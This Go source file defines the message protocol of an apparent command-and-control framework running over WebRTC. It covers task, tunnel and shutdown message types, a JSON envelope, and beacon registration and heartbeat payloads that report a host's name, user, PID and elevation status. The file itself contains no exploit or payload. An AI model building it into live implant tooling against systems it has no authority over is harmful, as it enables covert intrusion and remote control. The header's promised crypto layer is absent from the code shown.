// Package protocol defines the C2 message format, task types, and crypto layer
// that runs over the WebRTC data channel transport.
package protocol

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"time"
)

// MessageType indicates the kind of C2 message.
type MessageType string

const (
	MsgHeartbeat    MessageType = "heartbeat"
	MsgTask         MessageType = "task"
	MsgTaskResult   MessageType = "task_result"
	MsgTunnelOpen   MessageType = "tunnel_open"
	MsgTunnelData   MessageType = "tunnel_data"
	MsgTunnelClose  MessageType = "tunnel_close"
	MsgRegister     MessageType = "register"
	MsgError        MessageType = "error"
	MsgShutdown     MessageType = "shutdown"
	MsgPing         MessageType = "ping"
	MsgPong         MessageType = "pong"
)

// Envelope is the outer wrapper for all C2 messages.
type Envelope struct {
	Type      MessageType `json:"type"`
	ID        string      `json:"id"`
	Timestamp int64       `json:"ts"`
	SenderID  string      `json:"sender"`
	Payload   json.RawMessage `json:"payload,omitempty"`
}

// NewEnvelope creates a new message envelope with a random ID.
func NewEnvelope(msgType MessageType, senderID string, payload interface{}) (*Envelope, error) {
	id := generateID()

	var raw json.RawMessage
	if payload != nil {
		data, err := json.Marshal(payload)
		if err != nil {
			return nil, fmt.Errorf("protocol: marshal payload: %w", err)
		}
		raw = data
	}

	return &Envelope{
		Type:      msgType,
		ID:        id,
		Timestamp: time.Now().UnixMilli(),
		SenderID:  senderID,
		Payload:   raw,
	}, nil
}

// Serialize returns the JSON-encoded envelope.
func (e *Envelope) Serialize() ([]byte, error) {
	return json.Marshal(e)
}

// ParseEnvelope decodes a JSON-encoded envelope.
func ParseEnvelope(data []byte) (*Envelope, error) {
	var env Envelope
	if err := json.Unmarshal(data, &env); err != nil {
		return nil, fmt.Errorf("protocol: parse envelope: %w", err)
	}
	return &env, nil
}

// ExtractPayload deserializes the payload into the given type.
func (e *Envelope) ExtractPayload(v interface{}) error {
	if len(e.Payload) == 0 {
		return nil
	}
	return json.Unmarshal(e.Payload, v)
}

// HeartbeatPayload is sent by the beacon to indicate it's alive.
type HeartbeatPayload struct {
	BeaconID    string `json:"beacon_id"`
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	PID         int    `json:"pid"`
	Uptime      int64  `json:"uptime"`
	PrevTaskID  string `json:"prev_task_id,omitempty"`
}

// RegisterPayload is sent when a beacon first connects.
type RegisterPayload struct {
	BeaconID     string   `json:"beacon_id"`
	Hostname     string   `json:"hostname"`
	Username     string   `json:"username"`
	OS           string   `json:"os"`
	Arch         string   `json:"arch"`
	PID          int      `json:"pid"`
	Elevated     bool     `json:"elevated"`
	PublicIP     string   `json:"public_ip,omitempty"`
	Capabilities []string `json:"capabilities"`
}

// ErrorPayload carries error information.
type ErrorPayload struct {
	Code    int    `json:"code"`
	Message string `json:"message"`
	TaskID  string `json:"task_id,omitempty"`
}

func generateID() string {
	b := make([]byte, 12)
	rand.Read(b)
	return hex.EncodeToString(b)
}
